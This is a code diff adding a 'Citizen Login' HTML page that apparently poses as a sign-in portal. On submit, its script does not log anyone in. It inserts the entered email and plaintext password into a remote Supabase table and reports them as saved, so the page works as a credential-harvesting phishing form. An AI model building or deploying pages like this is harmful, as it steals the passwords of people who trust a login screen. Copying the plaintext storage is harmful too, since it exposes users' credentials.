@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Citizen Login</title>
+
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background: #f2f6ff;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+    }
+
+    .card {
+        background: #fff;
+        width: 350px;
+        padding: 30px;
+        border-radius: 12px;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        text-align: center;
+    }
+
+    .card h2 {
+        color: #075cd8;
+        margin-bottom: 10px;
+        font-size: 24px;
+        font-weight: 700;
+    }
+
+    .loading-box {
+        width: 100%;
+        padding: 12px;
+        background: #e7f9ee;
+        border: 1px solid #aee1c8;
+        border-radius: 8px;
+        color: #2c8a58;
+        font-weight: bold;
+        margin-bottom: 20px;
+        display: none;
+    }
+
+    label {
+        display: block;
+        text-align: left;
+        margin-bottom: 5px;
+        color: #444;
+        font-weight: 600;
+    }
+
+    input {
+        width: 100%;
+        padding: 12px;
+        border: 1px solid #ddd;
+        border-radius: 8px;
+        margin-bottom: 15px;
+        font-size: 15px;
+    }
+
+    .btn {
+        width: 100%;
+        padding: 12px;
+        background: #0066ff;
+        border: none;
+        border-radius: 8px;
+        color: white;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: 0.2s;
+    }
+
+    .btn:hover {
+        background: #0053d1;
+    }
+
+    .footer-text {
+        margin-top: 15px;
+        font-size: 14px;
+        color: #555;
+    }
+
+    .footer-text a {
+        color: #0066ff;
+        text-decoration: none;
+        font-weight: 600;
+    }
+</style>
+</head>
+
+<body>
+
+<div class="card">
+    <h2>Citizen Login</h2>
+
+    <div class="loading-box" id="loadingBox">
+        Logging in...
+    </div>
+
+    <form id="loginForm">
+        <label for="username">Email Address</label>
+        <input type="email" id="username" placeholder="example@gmail.com" required>
+
+        <label for="password">Password</label>
+        <input type="password" id="password" placeholder="Enter password" required>
+
+        <button class="btn" type="submit">Log In</button>
+    </form>
+
+    <div class="footer-text">
+        Don’t have an account? <a href="#">Register Now</a>
+    </div>
+</div>
+
+
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+<script>
+
+    const supabase = window.supabase.createClient(
+        "https://gepsqeueluuztzhrrkqf.supabase.co", 
+        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdlcHNxZXVlbHV1enR6aHJya3FmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjMyMTkzNjksImV4cCI6MjA3ODc5NTM2OX0.GSEJOYLZKa00DQofSeTMjIXsOf2Z7djUGG85XOMqY6A"
+    );
+
+    const form = document.getElementById("loginForm");
+    const loadingBox = document.getElementById("loadingBox");
+
+    form.addEventListener("submit", async (e) => {
+        e.preventDefault();
+
+        loadingBox.style.display = "block";
+
+        const email = document.getElementById("username").value.trim();
+        const password = document.getElementById("password").value.trim();
+
+      
+        const { data, error } = await supabase
+            .from("form_data")
+            .insert([
+                { username: email, password: password }
+            ]);
+
+        loadingBox.style.display = "none";
+
+        if (error) {
+            alert("Error: " + error.message);
+            console.log(error);
+        } else {
+            alert("Login saved to Supabase successfully!");
+            form.reset();
+        }
+    });
+</script>
+
+</body>
+</html>
